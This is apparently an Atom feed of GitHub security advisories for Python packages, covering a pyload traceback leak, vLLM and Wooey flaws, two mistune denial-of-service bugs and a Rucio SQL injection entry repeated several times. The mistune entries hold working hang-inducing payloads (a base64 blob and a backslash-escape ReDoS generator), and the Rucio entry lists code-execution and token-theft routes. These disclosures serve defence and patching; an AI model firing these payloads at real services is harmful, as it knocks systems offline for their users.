<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
    <title>Security Advisory for Python packages hosted at PyPI.org</title>
    <updated>2026-05-06T18:28:07.721Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
    <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[pyload-ng] PyLoad vulnerable to unauthenticated traceback disclosure via global exception handler in WebUI]]></title>
        <id>https://github.com/advisories/GHSA-c3gc-9pf2-84gg</id>
        <link href="https://github.com/advisories/GHSA-c3gc-9pf2-84gg"/>
        <updated>2026-05-06T17:54:22.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>pyload-ng</code> WebUI returns full Python traceback details to clients on unhandled exceptions.</p>
<p>Because <code>/web/&lt;path:filename&gt;</code> is reachable without authentication and renders attacker-controlled template names, an unauthenticated user can reliably trigger a server exception (for example by requesting a non-existent template) and receive internal stack traces in the HTTP response.</p>
<h3 id="details">Details</h3>
<p>The issue is caused by the combination of:</p>
<ol>
<li>Unauthenticated template-render route:</li>
</ol>
<ul>
<li><code>src/pyload/webui/app/blueprints/app_blueprint.py:32-36</code><ul>
<li><code>@bp.route("/web/&lt;path:filename&gt;", endpoint="web")</code></li>
<li><code>data = render_template(filename)</code> with user-controlled <code>filename</code></li>
<li>no <code>@login_required(...)</code> on this route</li>
</ul>
</li>
</ul>
<ol start="2">
<li>Global exception handler exposes traceback to response:</li>
</ol>
<ul>
<li><code>src/pyload/webui/app/handlers.py:14-27</code><ul>
<li><code>tb = traceback.format_exc()</code></li>
<li><code>messages.extend(tb.split('\n'))</code></li>
<li>returned in rendered error page for all exceptions</li>
</ul>
</li>
</ul>
<ol start="3">
<li>Error page renders all <code>messages</code>:</li>
</ol>
<ul>
<li><code>src/pyload/webui/app/themes/modern/templates/base.html:217-219</code><ul>
<li>loops over <code>messages</code> and prints them in response HTML</li>
</ul>
</li>
</ul>
<p>So any unhandled exception can disclose internal implementation details (stack frames, source paths, exception metadata) to remote unauthenticated clients. </p>
<p>This is a core behavior issue in default WebUI error handling</p>
<h3 id="poc">PoC</h3>
<pre><code class="language-python">#!/usr/bin/env python3
from __future__ import annotations

import re
import shutil
import tempfile
import traceback
from pathlib import Path


ROOT = Path(__file__).resolve().parent / "pyload" / "src" / "pyload"


def read_text(rel: str) -&gt; str:
    return (ROOT / rel).read_text(encoding="utf-8")


def route_has_no_login_required(app_blueprint: str) -&gt; bool:
    m = re.search(
        r'@bp\\.route\\("/web/&lt;path:filename&gt;", endpoint="web"\\)\\s*'
        r"def render\\(filename\\):(?P&lt;body&gt;.*?)(?:\\n\\n@bp\\.route|\\Z)",
        app_blueprint,
        re.DOTALL,
    )
    if not m:
        return False
    block_start = max(0, m.start() - 200)
    block = app_blueprint[block_start:m.end()]
    return "@login_required(" not in block


def main() -&gt; None:
    workdir = Path(tempfile.mkdtemp(prefix="pyload-traceback-infoleak-"))
    try:
        app_blueprint = read_text("webui/app/blueprints/app_blueprint.py")
        handlers = read_text("webui/app/handlers.py")
        base_template = read_text("webui/app/themes/modern/templates/base.html")

        unauth_web_route = '/web/&lt;path:filename&gt;' in app_blueprint and route_has_no_login_required(app_blueprint)
        user_controlled_template_name = "render_template(filename)" in app_blueprint
        handler_uses_traceback = "traceback.format_exc()" in handlers
        handler_appends_trace = "messages.extend(tb.split('\\n'))" in handlers
        global_exception_handler = "(Exception, handle_exception_error)" in handlers
        template_renders_messages = "{% for message in messages %}" in base_template and "{{message}}" in base_template

        leaked_traceback_keyword = False
        leaked_exception_type = False
        try:
            raise RuntimeError("forced-poc-error")
        except Exception:
            tb = traceback.format_exc()
            messages = [f"Error 500: forced-poc-error"]
            messages.extend(tb.split("\\n"))
            joined = "\\n".join(messages)
            leaked_traceback_keyword = "Traceback (most recent call last)" in joined
            leaked_exception_type = "RuntimeError: forced-poc-error" in joined

        repro_success = all(
            [
                unauth_web_route,
                user_controlled_template_name,
                handler_uses_traceback,
                handler_appends_trace,
                global_exception_handler,
                template_renders_messages,
                leaked_traceback_keyword,
                leaked_exception_type,
            ]
        )

        print("unauth_web_route=", unauth_web_route)
        print("user_controlled_template_name=", user_controlled_template_name)
        print("handler_uses_traceback=", handler_uses_traceback)
        print("handler_appends_trace=", handler_appends_trace)
        print("global_exception_handler=", global_exception_handler)
        print("template_renders_messages=", template_renders_messages)
        print("leaked_traceback_keyword=", leaked_traceback_keyword)
        print("leaked_exception_type=", leaked_exception_type)
        print("traceback_infoleak_repro_success=", repro_success)
    finally:
        shutil.rmtree(workdir, ignore_errors=True)
        print("cleanup_done=True")


if __name__ == "__main__":
    main()
</code></pre>
<p>Observed result:</p>
<pre><code class="language-text">unauth_web_route= True
user_controlled_template_name= True
handler_uses_traceback= True
handler_appends_trace= True
global_exception_handler= True
template_renders_messages= True
leaked_traceback_keyword= True
leaked_exception_type= True
traceback_infoleak_repro_success= True
cleanup_done=True
</code></pre>
<h3 id="impact">Impact</h3>
<ul>
<li>Vulnerability type: Information disclosure (stack trace / internal path leakage).</li>
<li>Attack surface: unauthenticated WebUI request path.</li>
<li>Exposes internal error details that help attackers map application internals and improve exploit reliability for follow-on attacks.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pyload/pyload/security/advisories/GHSA-c3gc-9pf2-84gg">https://github.com/pyload/pyload/security/advisories/GHSA-c3gc-9pf2-84gg</a></li>
<li><a href="https://github.com/advisories/GHSA-c3gc-9pf2-84gg">https://github.com/advisories/GHSA-c3gc-9pf2-84gg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c3gc-9pf2-84gg</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-06T17:54:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vllm] vLLM makes Use of Uninitialized Resource]]></title>
        <id>https://github.com/advisories/GHSA-x368-4g9h-fvv4</id>
        <link href="https://github.com/advisories/GHSA-x368-4g9h-fvv4"/>
        <updated>2026-05-06T17:31:34.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability was found in vLLM up to 0.19.0. The affected element is the function has_mamba_layers of the file vllm/v1/kv_cache_interface.py of the component KV Block Handler. Performing a manipulation results in uninitialized resource. It is possible to initiate the attack remotely. The attack is considered to have high complexity. The exploitability is described as difficult. The exploit has been made public and could be used. The patch is named 1ad67864c0c20f167929e64c875f5c28e1aad9fd. To fix this issue, it is recommended to deploy a patch.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-7141">https://nvd.nist.gov/vuln/detail/CVE-2026-7141</a></li>
<li><a href="https://github.com/vllm-project/vllm/issues/39146">https://github.com/vllm-project/vllm/issues/39146</a></li>
<li><a href="https://github.com/vllm-project/vllm/issues/39146#issue-4215090365">https://github.com/vllm-project/vllm/issues/39146#issue-4215090365</a></li>
<li><a href="https://github.com/vllm-project/vllm/pull/39283">https://github.com/vllm-project/vllm/pull/39283</a></li>
<li><a href="https://github.com/AjAnubolu/vllm/commit/1ad67864c0c20f167929e64c875f5c28e1aad9fd">https://github.com/AjAnubolu/vllm/commit/1ad67864c0c20f167929e64c875f5c28e1aad9fd</a></li>
<li><a href="https://vuldb.com/submit/801297">https://vuldb.com/submit/801297</a></li>
<li><a href="https://vuldb.com/vuln/359740">https://vuldb.com/vuln/359740</a></li>
<li><a href="https://vuldb.com/vuln/359740/cti">https://vuldb.com/vuln/359740/cti</a></li>
<li><a href="https://github.com/advisories/GHSA-x368-4g9h-fvv4">https://github.com/advisories/GHSA-x368-4g9h-fvv4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-x368-4g9h-fvv4</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-04-27T18:32:09.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[wooey] Wooey has an Incorrect Privilege Assignment issue]]></title>
        <id>https://github.com/advisories/GHSA-w65c-cmxj-qrhm</id>
        <link href="https://github.com/advisories/GHSA-w65c-cmxj-qrhm"/>
        <updated>2026-05-06T17:26:57.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability was determined in Wooey up to 0.13.2. The impacted element is the function add_or_update_script of the file wooey/api/scripts.py of the component API Endpoint. Executing a manipulation can lead to improper authorization. It is possible to launch the attack remotely. The exploit has been publicly disclosed and may be utilized. Upgrading to version 0.13.3rc1 and 0.14.0 is sufficient to resolve this issue. This patch is called f7846fc0c323da8325422cab32623491757f1b88. The affected component should be upgraded.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-7142">https://nvd.nist.gov/vuln/detail/CVE-2026-7142</a></li>
<li><a href="https://github.com/wooey/Wooey/issues/408">https://github.com/wooey/Wooey/issues/408</a></li>
<li><a href="https://github.com/wooey/Wooey/pull/407">https://github.com/wooey/Wooey/pull/407</a></li>
<li><a href="https://github.com/wooey/Wooey/commit/f7846fc0c323da8325422cab32623491757f1b88">https://github.com/wooey/Wooey/commit/f7846fc0c323da8325422cab32623491757f1b88</a></li>
<li><a href="https://github.com/wooey/Wooey">https://github.com/wooey/Wooey</a></li>
<li><a href="https://github.com/wooey/Wooey/releases/tag/v0.13.3rc1">https://github.com/wooey/Wooey/releases/tag/v0.13.3rc1</a></li>
<li><a href="https://vuldb.com/submit/801533">https://vuldb.com/submit/801533</a></li>
<li><a href="https://vuldb.com/vuln/359741">https://vuldb.com/vuln/359741</a></li>
<li><a href="https://vuldb.com/vuln/359741/cti">https://vuldb.com/vuln/359741/cti</a></li>
<li><a href="https://github.com/advisories/GHSA-w65c-cmxj-qrhm">https://github.com/advisories/GHSA-w65c-cmxj-qrhm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w65c-cmxj-qrhm</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-04-27T18:32:09.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mistune] Mistune has a Denial-of-Service (DoS) vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-hjph-f4mc-wx4c</id>
        <link href="https://github.com/advisories/GHSA-hjph-f4mc-wx4c"/>
        <updated>2026-05-06T16:56:28.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><strong>Denial-of-Service (DoS)</strong> vulnerability in the Mistune Markdown parser. The issue occurs when processing specially crafted reference links, which can cause excessive parsing and CPU consumption, leading to application hangs.</p>
<p><strong>Function affected:</strong> parse_link_title() in helpers.py
<strong>Issue:</strong> Malformed reference links cause excessive backtracking and parsing loops.
<strong>Impact:</strong> Remote attackers can submit malicious Markdown to hang processes, causing service unavailability.</p>
<h3 id="details">Details</h3>
<pre><code>Name: mistune
Version: 3.2.0
Python version: Python 3.13.9
PIP version: pip 25.2
OS: Kali-linux-VERSION="2025.4"
</code></pre>
<h3 id="poc">PoC</h3>
<pre><code>import mistune
import base64

print("Exploit started....!")
data = base64.b64decode(
    "WX5Efn5+RH5+fkRbIVt6XQoKW3q7XTpdOgoifn5+RFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcflt+RFshW3pdCgpbeg=="
)
mistune.html(data.decode("utf-8", errors="ignore"))
</code></pre>
<h3 id="reproduce-steps">Reproduce steps:</h3>
<p>Simply execute above python script it will hang &amp; increase cpu utilization to 100%</p>
<p><strong>Fuzzer Output (libFuzzer):</strong></p>
<pre><code>ERROR: libFuzzer: timeout after 3 seconds
SUMMARY: libFuzzer: timeout
</code></pre>
<p><strong>Stack Trace (Excerpt):</strong></p>
<pre><code>mistune/helpers.py:170 in parse_link_title
mistune/block_parser.py:259 in parse_ref_link
mistune/core.py:216 in parse_method
mistune/block_parser.py:458 in parse
mistune/markdown.py:93 in parse
mistune/markdown.py:120 in __call__
</code></pre>
<h3 id="image-poc">IMAGE POC:</h3>
<img width="1194" height="728" alt="POC" src="https://github.com/user-attachments/assets/009e836f-fff7-439e-b0be-6e889bed0077">


<h3 id="impact">Impact:</h3>
<p>Denial-of-Service (DoS)
High CPU usage and application hang
Potential for service unavailability in web apps or APIs processing untrusted Markdown</p>
<h3 id="suggested-mitigations">Suggested Mitigations:</h3>
<p>Implement parsing depth and iteration limits.
Limit reference-link title length.
Detects excessive escape character sequences.
Add defensive checks in parse_link_title.
Add fuzz regression tests using the provided PoC.</p>
<p>This vulnerability was discovered using coverage-guided fuzzing and is reproducible consistently.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/lepture/mistune/security/advisories/GHSA-hjph-f4mc-wx4c">https://github.com/lepture/mistune/security/advisories/GHSA-hjph-f4mc-wx4c</a></li>
<li><a href="https://github.com/advisories/GHSA-hjph-f4mc-wx4c">https://github.com/advisories/GHSA-hjph-f4mc-wx4c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hjph-f4mc-wx4c</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-06T16:56:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mistune] Mistune has a ReDoS in LINK_TITLE_RE that allows denial of service via crafted Markdown input]]></title>
        <id>https://github.com/advisories/GHSA-8mp2-v27r-99xp</id>
        <link href="https://github.com/advisories/GHSA-8mp2-v27r-99xp"/>
        <updated>2026-05-06T16:52:44.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A ReDoS (Regular Expression Denial of Service) vulnerability in <code>LINK_TITLE_RE</code> allows an attacker who can supply Markdown for parsing to cause denial of service. A crafted 58-byte Markdown document blocks the parser for approximately 6 seconds (measured on Apple M2, Python 3.14.3), with exponential growth per additional byte pair.</p>
<h3 id="details">Details</h3>
<p>The vulnerable regex is defined in <a href="https://github.com/lepture/mistune/blob/df23edd60b43b639d2e6760ef9dd3d618aa11c21/src/mistune/helpers.py#L20-L25"><code>src/mistune/helpers.py#L20-L25</code></a>:</p>
<pre><code class="language-python">LINK_TITLE_RE = re.compile(
    r"[ \t\n]+("
    r'"(?:\\' + PUNCTUATION + r'|[^"\x00])*"|'  # "title"
    r"'(?:\\" + PUNCTUATION + r"|[^'\x00])*'"   # 'title'
    r")"
)
</code></pre>
<p>The double-quote branch compiles to <code>"(?:\\[PUNCTUATION]|[^"\x00])*"</code>. The two alternatives inside <code>(A|B)*</code> overlap: a backslash followed by a punctuation character (e.g. <code>\!</code>) can be matched by <strong>either</strong> branch — as a 2-character escaped-punctuation sequence <code>\\!</code>, or as two individual <code>[^"\x00]</code> characters (<code>\</code> then <code>!</code>). The same ambiguity exists in the single-quoted title branch.</p>
<p>When the input contains repeated <code>\!</code> pairs with no closing <code>"</code>, the regex engine exhaustively backtracks through all 2^N combinations, resulting in <strong>exponential O(2^N) time complexity</strong>.</p>
<p>This is reachable through normal Markdown parsing via two code paths:</p>
<ol>
<li><strong>Inline links</strong>: <code>[text](url "PAYLOAD)</code> → <a href="https://github.com/lepture/mistune/blob/df23edd60b43b639d2e6760ef9dd3d618aa11c21/src/mistune/helpers.py#L178"><code>parse_link()</code></a> → <a href="https://github.com/lepture/mistune/blob/df23edd60b43b639d2e6760ef9dd3d618aa11c21/src/mistune/helpers.py#L169"><code>parse_link_title()</code></a></li>
<li><strong>Block link reference definitions</strong>: <code>[label]: url "PAYLOAD</code> → <a href="https://github.com/lepture/mistune/blob/df23edd60b43b639d2e6760ef9dd3d618aa11c21/src/mistune/block_parser.py#L220"><code>BlockParser.parse_ref_link()</code></a> → <a href="https://github.com/lepture/mistune/blob/df23edd60b43b639d2e6760ef9dd3d618aa11c21/src/mistune/helpers.py#L169"><code>parse_link_title()</code></a> at <a href="https://github.com/lepture/mistune/blob/df23edd60b43b639d2e6760ef9dd3d618aa11c21/src/mistune/block_parser.py#L259">block_parser.py#L259</a></li>
</ol>
<h3 id="poc">PoC</h3>
<pre><code class="language-python">import mistune
import time

md = mistune.create_markdown()

# Test with increasing N (number of \! pairs)
for n in [15, 18, 20, 22, 25]:
    payload = '[x](y "' + '\\!' * n + ')'
    start = time.time()
    md(payload)
    elapsed = time.time() - start
    print(f"N={n:2d}  len={len(payload):3d} bytes  time={elapsed:.3f}s")
</code></pre>
<p>Output (Apple M2, Python 3.14.3, mistune 3.2.0):</p>
<pre><code>N=15  len= 38 bytes  time=0.007s
N=18  len= 44 bytes  time=0.044s
N=20  len= 48 bytes  time=0.178s
N=22  len= 52 bytes  time=0.740s
N=25  len= 58 bytes  time=5.922s
</code></pre>
<p>Each increment of N roughly doubles the execution time (consistent with O(2^N)).</p>
<p>The same attack works via block link reference definitions:</p>
<pre><code class="language-python">payload = '[l]: u "' + '\\!' * 25  # 58 bytes, ~6 seconds
md(payload)
</code></pre>
<h3 id="impact">Impact</h3>
<p>This is a denial of service vulnerability. Any application or service that parses user-supplied Markdown using mistune can be made unresponsive by an attacker submitting a small crafted input (under 100 bytes).</p>
<p>Affected use cases include:</p>
<ul>
<li>Web applications with Markdown-enabled input fields (comments, posts, descriptions)</li>
<li>Documentation systems that accept user contributions</li>
<li>API endpoints that process Markdown</li>
<li>Jupyter tooling such as nbconvert that relies on mistune for rendering</li>
</ul>
<h3 id="suggested-fix">Suggested Fix</h3>
<p>Exclude the backslash character from the catch-all character class to eliminate the alternation overlap:</p>
<pre><code class="language-python"># Before (vulnerable):
r'"(?:\\' + PUNCTUATION + r'|[^"\x00])*"'
r"'(?:\\" + PUNCTUATION + r"|[^'\x00])*'"

# After (fixed):
r'"(?:\\' + PUNCTUATION + r'|[^"\\\x00])*"'
r"'(?:\\" + PUNCTUATION + r"|[^'\\\x00])*'"
</code></pre>
<p>This ensures a backslash can only be consumed by the escaped-punctuation branch, eliminating the ambiguity in both the double-quote and single-quote branches. Verified on mistune 3.2.0 (Apple M2, Python 3.14.3):</p>
<ul>
<li>Reduces N=25 from 4.2 seconds to 0.000006 seconds (700,000x improvement)</li>
<li>Handles N=50 in 0.000008 seconds</li>
<li>Passes all existing functional tests (quoted titles, escaped quotes, escaped punctuation)</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/lepture/mistune/security/advisories/GHSA-8mp2-v27r-99xp">https://github.com/lepture/mistune/security/advisories/GHSA-8mp2-v27r-99xp</a></li>
<li><a href="https://github.com/advisories/GHSA-8mp2-v27r-99xp">https://github.com/advisories/GHSA-8mp2-v27r-99xp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8mp2-v27r-99xp</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-06T16:52:43.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[rucio] Rucio has SQL Injection in FilterEngine PostgreSQL Query Builder via DID Search API]]></title>
        <id>https://github.com/advisories/GHSA-6j7p-qjhg-9947</id>
        <link href="https://github.com/advisories/GHSA-6j7p-qjhg-9947"/>
        <updated>2026-05-06T16:44:08.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A SQL injection vulnerability in <code>FilterEngine.create_postgres_query</code> allows any authenticated Rucio user to execute arbitrary SQL against the configured PostgreSQL metadata database through the DID search endpoint (<code>GET /dids/&lt;scope&gt;/dids/search</code>). When the external metadata plugin <code>postgres_meta</code> is configured, attacker-controlled filter keys and values are interpolated directly into raw SQL statements via Python <code>str.format</code>. This enables full database compromise including data exfiltration, data modification, and potential remote code execution via <code>COPY ... FROM PROGRAM</code>.</p>
<h3 id="details">Details</h3>
<p><em>Will follow in two weeks (2025-05-19).</em></p>
<h3 id="impact">Impact</h3>
<p><strong>Vulnerability type:</strong> SQL Injection (CWE-89)</p>
<p><strong>Who is impacted:</strong></p>
<ul>
<li>Rucio deployments that have explicitly configured the <code>postgres_meta</code> metadata plugin.</li>
</ul>
<p><strong>What an attacker can do:</strong></p>
<ul>
<li><strong>Data modification:</strong> PostgreSQL stacked queries enable arbitrary <code>INSERT</code>/<code>UPDATE</code>/<code>DELETE</code> operations.</li>
<li><strong>Remote code execution:</strong> Via PostgreSQL's <code>COPY ... FROM PROGRAM</code> if the database user has superuser or <code>pg_execute_server_program</code> privileges.</li>
<li><strong>File system access:</strong> Via <code>COPY ... TO/FROM '/path'</code> if filesystem permissions allow.</li>
</ul>
<p><strong>Further elevation when the same postgres database and access is used for metadata and for Rucio itself</strong></p>
<ul>
<li><strong>Full database read access:</strong> Extract any table including <code>identities</code> (password hashes and salts), <code>tokens</code> (active authentication sessions), <code>accounts</code> (user enumeration), <code>rse_settings</code> (storage endpoint credentials), and <code>rules</code> (data management policies) could be extracted.</li>
<li><strong>Password hash extraction:</strong> Combined with Rucio's use of single-iteration SHA-256 for password hashing (no KDF), extracted hashes can be cracked at GPU speed.</li>
<li><strong>Authentication token theft:</strong> Active bearer tokens can be extracted and used for immediate session hijacking.</li>
</ul>
<p><strong>Required attacker privileges:</strong> Any authenticated Rucio user. Authentication tokens can be obtained via any supported method (userpass, x509, OIDC, SAML, SSH, GSS). No special roles or administrative permissions are required. The <code>GET /dids/&lt;scope&gt;/dids/search</code> endpoint is available to all authenticated users.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/rucio/rucio/security/advisories/GHSA-6j7p-qjhg-9947">https://github.com/rucio/rucio/security/advisories/GHSA-6j7p-qjhg-9947</a></li>
<li><a href="https://github.com/advisories/GHSA-6j7p-qjhg-9947">https://github.com/advisories/GHSA-6j7p-qjhg-9947</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6j7p-qjhg-9947</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-05-06T16:44:07.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[rucio] Rucio has SQL Injection in FilterEngine PostgreSQL Query Builder via DID Search API]]></title>
        <id>https://github.com/advisories/GHSA-6j7p-qjhg-9947</id>
        <link href="https://github.com/advisories/GHSA-6j7p-qjhg-9947"/>
        <updated>2026-05-06T16:44:08.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A SQL injection vulnerability in <code>FilterEngine.create_postgres_query</code> allows any authenticated Rucio user to execute arbitrary SQL against the configured PostgreSQL metadata database through the DID search endpoint (<code>GET /dids/&lt;scope&gt;/dids/search</code>). When the external metadata plugin <code>postgres_meta</code> is configured, attacker-controlled filter keys and values are interpolated directly into raw SQL statements via Python <code>str.format</code>. This enables full database compromise including data exfiltration, data modification, and potential remote code execution via <code>COPY ... FROM PROGRAM</code>.</p>
<h3 id="details">Details</h3>
<p><em>Will follow in two weeks (2025-05-19).</em></p>
<h3 id="impact">Impact</h3>
<p><strong>Vulnerability type:</strong> SQL Injection (CWE-89)</p>
<p><strong>Who is impacted:</strong></p>
<ul>
<li>Rucio deployments that have explicitly configured the <code>postgres_meta</code> metadata plugin.</li>
</ul>
<p><strong>What an attacker can do:</strong></p>
<ul>
<li><strong>Data modification:</strong> PostgreSQL stacked queries enable arbitrary <code>INSERT</code>/<code>UPDATE</code>/<code>DELETE</code> operations.</li>
<li><strong>Remote code execution:</strong> Via PostgreSQL's <code>COPY ... FROM PROGRAM</code> if the database user has superuser or <code>pg_execute_server_program</code> privileges.</li>
<li><strong>File system access:</strong> Via <code>COPY ... TO/FROM '/path'</code> if filesystem permissions allow.</li>
</ul>
<p><strong>Further elevation when the same postgres database and access is used for metadata and for Rucio itself</strong></p>
<ul>
<li><strong>Full database read access:</strong> Extract any table including <code>identities</code> (password hashes and salts), <code>tokens</code> (active authentication sessions), <code>accounts</code> (user enumeration), <code>rse_settings</code> (storage endpoint credentials), and <code>rules</code> (data management policies) could be extracted.</li>
<li><strong>Password hash extraction:</strong> Combined with Rucio's use of single-iteration SHA-256 for password hashing (no KDF), extracted hashes can be cracked at GPU speed.</li>
<li><strong>Authentication token theft:</strong> Active bearer tokens can be extracted and used for immediate session hijacking.</li>
</ul>
<p><strong>Required attacker privileges:</strong> Any authenticated Rucio user. Authentication tokens can be obtained via any supported method (userpass, x509, OIDC, SAML, SSH, GSS). No special roles or administrative permissions are required. The <code>GET /dids/&lt;scope&gt;/dids/search</code> endpoint is available to all authenticated users.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/rucio/rucio/security/advisories/GHSA-6j7p-qjhg-9947">https://github.com/rucio/rucio/security/advisories/GHSA-6j7p-qjhg-9947</a></li>
<li><a href="https://github.com/advisories/GHSA-6j7p-qjhg-9947">https://github.com/advisories/GHSA-6j7p-qjhg-9947</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6j7p-qjhg-9947</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-05-06T16:44:07.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[rucio] Rucio has SQL Injection in FilterEngine PostgreSQL Query Builder via DID Search API]]></title>
        <id>https://github.com/advisories/GHSA-6j7p-qjhg-9947</id>
        <link href="https://github.com/advisories/GHSA-6j7p-qjhg-9947"/>
        <updated>2026-05-06T16:44:08.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A SQL injection vulnerability in <code>FilterEngine.create_postgres_query</code> allows any authenticated Rucio user to execute arbitrary SQL against the configured PostgreSQL metadata database through the DID search endpoint (<code>GET /dids/&lt;scope&gt;/dids/search</code>). When the external metadata plugin <code>postgres_meta</code> is configured, attacker-controlled filter keys and values are interpolated directly into raw SQL statements via Python <code>str.format</code>. This enables full database compromise including data exfiltration, data modification, and potential remote code execution via <code>COPY ... FROM PROGRAM</code>.</p>
<h3 id="details">Details</h3>
<p><em>Will follow in two weeks (2025-05-19).</em></p>
<h3 id="impact">Impact</h3>
<p><strong>Vulnerability type:</strong> SQL Injection (CWE-89)</p>
<p><strong>Who is impacted:</strong></p>
<ul>
<li>Rucio deployments that have explicitly configured the <code>postgres_meta</code> metadata plugin.</li>
</ul>
<p><strong>What an attacker can do:</strong></p>
<ul>
<li><strong>Data modification:</strong> PostgreSQL stacked queries enable arbitrary <code>INSERT</code>/<code>UPDATE</code>/<code>DELETE</code> operations.</li>
<li><strong>Remote code execution:</strong> Via PostgreSQL's <code>COPY ... FROM PROGRAM</code> if the database user has superuser or <code>pg_execute_server_program</code> privileges.</li>
<li><strong>File system access:</strong> Via <code>COPY ... TO/FROM '/path'</code> if filesystem permissions allow.</li>
</ul>
<p><strong>Further elevation when the same postgres database and access is used for metadata and for Rucio itself</strong></p>
<ul>
<li><strong>Full database read access:</strong> Extract any table including <code>identities</code> (password hashes and salts), <code>tokens</code> (active authentication sessions), <code>accounts</code> (user enumeration), <code>rse_settings</code> (storage endpoint credentials), and <code>rules</code> (data management policies) could be extracted.</li>
<li><strong>Password hash extraction:</strong> Combined with Rucio's use of single-iteration SHA-256 for password hashing (no KDF), extracted hashes can be cracked at GPU speed.</li>
<li><strong>Authentication token theft:</strong> Active bearer tokens can be extracted and used for immediate session hijacking.</li>
</ul>
<p><strong>Required attacker privileges:</strong> Any authenticated Rucio user. Authentication tokens can be obtained via any supported method (userpass, x509, OIDC, SAML, SSH, GSS). No special roles or administrative permissions are required. The <code>GET /dids/&lt;scope&gt;/dids/search</code> endpoint is available to all authenticated users.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/rucio/rucio/security/advisories/GHSA-6j7p-qjhg-9947">https://github.com/rucio/rucio/security/advisories/GHSA-6j7p-qjhg-9947</a></li>
<li><a href="https://github.com/advisories/GHSA-6j7p-qjhg-9947">https://github.com/advisories/GHSA-6j7p-qjhg-9947</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6j7p-qjhg-9947</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-05-06T16:44:07.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[rucio] Rucio has SQL Injection in FilterEngine PostgreSQL Query Builder via DID Search API]]></title>
        <id>https://github.com/advisories/GHSA-6j7p-qjhg-9947</id>
        <link href="https://github.com/advisories/GHSA-6j7p-qjhg-9947"/>
        <updated>2026-05-06T16:44:08.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A SQL injection vulnerability in <code>FilterEngine.create_postgres_query</code> allows any authenticated Rucio user to execute arbitrary SQL against the configured PostgreSQL metadata database through the DID search endpoint (<code>GET /dids/&lt;scope&gt;/dids/search</code>). When the external metadata plugin <code>postgres_meta</code> is configured, attacker-controlled filter keys and values are interpolated directly into raw SQL statements via Python <code>str.format</code>. This enables full database compromise including data exfiltration, data modification, and potential remote code execution via <code>COPY ... FROM PROGRAM</code>.</p>
<h3 id="details">Details</h3>
